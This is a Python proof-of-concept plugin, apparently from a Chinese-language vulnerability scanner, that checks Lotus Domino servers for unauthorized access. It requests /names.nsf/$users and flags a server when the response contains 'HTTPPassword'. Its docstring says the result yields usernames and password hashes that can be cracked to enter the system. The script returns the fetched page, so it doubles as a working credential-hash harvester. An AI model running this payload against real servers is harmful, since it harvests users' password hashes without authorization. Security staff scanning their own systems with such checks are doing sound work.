#!/usr/bin/env python
# -*- coding: utf-8 -*- 
'''
name: domino_unauth未授权漏洞
referer: unknow
author: Lucifer
description: lotus-domino未授权访问，可以获得用户名和密码hash列表，可通过破解弱口令进入系统
'''
import sys
import requests
import warnings
from termcolor import cprint

class domino_unauth_BaseVerify:
    def __init__(self, url):
        self.url = url

    def run(self):
        payload = "/names.nsf/$users"
        vulnurl = self.url + payload
        try:
            req = requests.get(vulnurl, timeout=10, verify=False)

            if r"HTTPPassword" in req.text:
                cprint("[+]存在domino未授权漏洞...(高危)\tpayload: "+vulnurl, "red")
                return True, vulnurl, "domino_unauth未授权漏洞", payload, req.text
            else:
                cprint("[-]不存在domino_unauth漏洞", "white", "on_grey")
                return False, None, None, None, None

        except:
            cprint("[-] "+__file__+"====>可能不存在漏洞", "cyan")
            return False, None, None, None, None

if __name__ == "__main__":
    warnings.filterwarnings("ignore")
    testVuln = domino_unauth_BaseVerify(sys.argv[1])
    testVuln.run()
